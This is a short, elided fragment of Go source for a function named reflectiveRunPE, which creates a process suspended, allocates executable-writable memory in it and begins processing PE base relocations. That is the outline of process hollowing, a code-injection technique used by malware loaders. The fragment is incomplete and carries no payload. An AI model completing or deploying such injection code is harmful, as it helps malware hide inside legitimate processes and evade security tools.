...
func reflectiveRunPE(destPE []byte) bool {
	...
	err2 := syscall.CreateProcess(cmd, nil, nil, nil, false, variables.CREATE_SUSPENDED, nil, nil, si, pi)
	if err2 != nil {
		return false
	}
	...
	newImageBase, err := IntVirtualAllocEx(hProcess, baseAddr, oh.SizeOfImage, variables.MEM_RESERVE|variables.MEM_COMMIT, variables.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return false
	}
	...
	if delta != 0 && false {
		...
		for read < rel.Size {
			...
			for _, rrr := range re {
				if rrr.Type() == variables.IMAGE_REL_BASED_DIR64 {
